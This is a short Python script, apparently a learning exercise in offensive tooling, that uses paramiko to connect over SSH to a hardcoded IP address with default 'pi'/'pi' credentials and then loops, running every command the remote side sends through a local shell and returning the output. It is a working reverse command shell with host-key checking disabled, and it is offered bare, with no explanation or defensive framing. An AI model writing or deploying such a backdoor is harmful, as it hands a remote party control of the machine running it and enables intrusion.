import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/root/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(str.encode(command))
        print(bytes.decode(ssh_session.recv(1024)))
        while True:
            command = bytes.decode(ssh_session.recv(1024))
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(bytes.decode(str(e)))
        client.close()
    return

ssh_command('192.186.6.129','pi','pi','ClientConnected')